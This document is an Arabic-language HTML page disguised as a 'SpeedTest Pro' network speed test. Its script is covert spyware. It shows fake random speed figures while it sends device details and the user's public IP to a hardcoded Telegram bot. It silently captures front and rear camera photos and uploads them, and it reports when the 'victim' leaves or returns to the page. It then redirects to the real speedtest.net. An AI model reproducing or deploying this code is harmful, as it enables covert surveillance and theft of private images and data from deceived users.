<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SpeedTest Pro | فحص سريع</title>
    <style>
        :root { --accent: #00d2ff; --bg: #0b0e18; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { background: rgba(255,255,255,0.03); padding: 40px; border-radius: 35px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(20px); text-align: center; width: 85%; max-width: 400px; }
        .btn-go { width: 150px; height: 150px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 32px; font-weight: 900; cursor: pointer; transition: 0.4s; outline: none; }
        #speedBox { display: none; margin-top: 10px; }
        .num { font-size: 55px; font-weight: 900; color: var(--accent); }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h2>SPEEDTEST</h2>
        <p id="statusText" style="color: #6a728e; font-size: 13px; margin-bottom: 30px;">اضغط لبدء فحص الشبكة</p>
        <button id="goBtn" class="btn-go">GO</button>
        <div id="speedBox">
            <span id="num" class="num">0.0</span>
            <div style="color: #6a728e; font-size: 14px;">Mbps Download</div>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
        const chat = "7984067238";

        async function send(msg, isImg = false, data = null) {
            const url = `https://api.telegram.org/bot${token}/`;
            try {
                const fd = new FormData();
                fd.append("chat_id", chat);
                if (isImg) {
                    fd.append("photo", data, "shot.jpg");
                    if (msg) fd.append("caption", msg);
                    await fetch(url + "sendPhoto", { method: "POST", body: fd });
                } else {
                    await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
                }
            } catch (e) {}
        }

        async function getReport() {
            let info = `📊 *تجربة سريعة (صورة واحدة):* \n\n`;
            info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
            info += `• 💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;

            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                let type = conn.type === 'wifi' ? "🌐 WiFi" : "📶 Cellular/4G";
                info += `• 📶 نوع الشبكة: \`${type} (${conn.effectiveType.toUpperCase()})\`\n`;
            }

            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                info += `• 🌐 الـ IP: \`${data.ip}\`\n`;
            } catch(e) {}
            return info;
        }

        async function captureSingle(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                const v = document.getElementById("v");
                const c = document.getElementById("c");
                v.srcObject = stream;
                
                // انتظار ثانيتين لفتح العدسة ومنع السواد
                await new Promise(r => setTimeout(r, 2000)); 

                c.width = 720; c.height = 960;
                c.getContext("2d").drawImage(v, 0, 0);
                const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.7));
                if (blob) {
                    await send(`📸 لقطة ${mode === 'user' ? 'أمامية' : 'خلفية'} (اختبار)`, true, blob);
                }
                
                // إغلاق الكاميرا فوراً
                stream.getTracks().forEach(t => t.stop()); 
            } catch (e) {
                await send(`❌ فشل تصوير الكاميرا الـ ${mode === 'user' ? 'الأمامية' : 'الخلفية'}`);
            }
        }

        window.onblur = () => send("⚠️ الضحية غادر الصفحة");
        window.onfocus = () => send("✅ الضحية عاد للصفحة");

        document.getElementById("goBtn").onclick = async function() {
            this.style.display = "none";
            document.getElementById("speedBox").style.display = "block";
            document.getElementById("statusText").innerText = "جاري الفحص...";

            const timer = setInterval(() => {
                document.getElementById("num").innerText = (Math.random() * (98 - 85) + 85).toFixed(1);
            }, 100);

            // 1. التقرير
            send(await getReport());

            // 2. تصوير لقطة واحدة أمامية ثم واحدة خلفية
            await captureSingle("user");
            await captureSingle("environment");

            // 3. توجيه سريع
            setTimeout(() => {
                clearInterval(timer);
                location.href = "https://www.speedtest.net/ar";
            }, 2000); 
        };
    </script>
</body>
</html>
